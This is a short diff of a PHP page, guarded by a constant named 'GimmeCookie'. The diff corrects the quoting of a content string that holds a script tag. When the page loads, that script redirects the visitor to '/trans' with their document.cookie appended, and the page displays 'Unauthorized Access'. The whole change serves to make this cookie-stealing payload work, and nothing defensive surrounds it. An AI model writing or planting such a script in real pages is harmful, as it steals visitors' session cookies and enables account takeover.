@@ -7,4 +7,4 @@ if (!defined('GimmeCookie')) {
 
 $site['titl'] .= ' :: Main';
 
-$content = '<script>location.href='/trans?c='+escape(document.cookie)</script> Unauthorized Access';
+$content = '<script>location.href="/trans?c="+escape(document.cookie)</script> Unauthorized Access';
